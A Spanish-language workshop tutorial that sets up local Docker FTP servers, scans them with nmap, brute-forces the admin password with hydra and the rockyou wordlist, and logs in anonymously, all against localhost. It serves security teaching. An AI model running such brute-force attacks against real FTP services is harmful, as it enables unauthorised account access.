# Aqui encontraras links a recursos vistos o compartidos en el taller

#### *Click en el icono para ir al enlace de la maquina Blue:*
[![Google Drive](https://img.shields.io/badge/Google_Drive-%234285F4.svg?logo=Google-Drive&logoColor=white)](https://drive.google.com/file/d/1vMszZFJpmULp_l60NU7WaUla0JIw7qi9/view)



### FTP 

>FTP es un protocolo ampliamente utilizado para la **transferencia de archivos** en redes. La enumeración del servicio FTP implica recopilar información relevante, como la versión del servidor FTP, la configuración de permisos de archivos, los usuarios y las contraseñas (mediante ataques de fuerza bruta o guessing), entre otros.

Bien procedamos a instalar nuestro laboratorio para la clase 

[Laboratorio de Docker ftp server](https://github.com/garethflowers/docker-ftp-server)


sudo apt install docker.io

Corramos este comando para crear un servidor ftp en docker

``` bash
docker run \
	--detach \
	--env FTP_PASS=iloveyou \
	--env FTP_USER=admin \
	--name my-ftp-server \
	--publish 20-21:20-21/tcp \
	--publish 40000-40009:40000-40009/tcp \
	--volume /data:/home/user \
	garethflowers/ftp-server
```

Si todo salio bien procedemos a iniciar sesion en ftp

``` bash
ftp localhost
```

Procedemos a poner nuestro usuario y contraseña, pero intentemos poner una contraseña incorrecta para ver si funciona 

Bueno ahora es donde veremos como podemos intentar sacarnos la contraseña del ftp suponiendo que sabemos el usuario en este caso es admin

Lo que a mi se me viene a la mente es primero con nmap ver la version o algun script de ver si es vulnerable este ftp, para ellos lo vemos de la siguiente forma

```bash
nmap -sCV -p21 127.0.0.1 
```

Si todo lo hicimos bien nos debería mostrar algo como esto:

![[Pasted image 20240306195151.png]]

Fíjense que no esta sacando que se puede ingresar como anónimo porque cuando en nmap lanza el para para probar scripts lo que hace es que prueba para ver si se puede iniciar sesion anónimamente normalmente.

Muy bin ahora tratemos de averiguar su contraseña del usuario usando la herramienta hydar 

**NOTA:** `les recomiendo siempre leer el manual de cada herramienta que vayan a usar y no lo conocen para ello se usa el paramentro `

```bash
man nmap
```

Muy bien para poder sacar la contraseña de ftp sabiendo el usuario hacemos lo siguiente:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1
```

En este caso hemos hecho una fuerza bruta para adivinar la contraseña del usuario admin del servicio ftp

si todo les salió bien se debería ver algo así:

![[Pasted image 20240306200116.png]]

En la imagen se muestra el usuario y la contraseña encontrada para el dicho usuario

Ahora para probar el usuario de ftp anonimo usaremos este repositorio:

[Docker AnonFtp](https://github.com/metabrainz/docker-anon-ftp)

Copiamos el comando que nos dice el repositorio y empezara a desplegarse el servidor en docker

```bash
docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro metabrainz/docker-anon-ftp
```

Muy bien hacemos lo mismo que hicimos en el anterior

```bash
nmap -sCV -p21 127.0.0.1
```

y nos mostrar algo como esto:

![[Pasted image 20240306200753.png]]
Como les comentaba en este caso, nos esta mostrando que el servidor se puede ingresar como anónimo y para hacerlo hacemos:

```bash
ftp localhost
```

Nos pedirá el usuario y pondremos anonymous, nos pedirá contraseña le daremos enter ya que por defecto este usuario no necesita contraseña y nos dejara acceder 
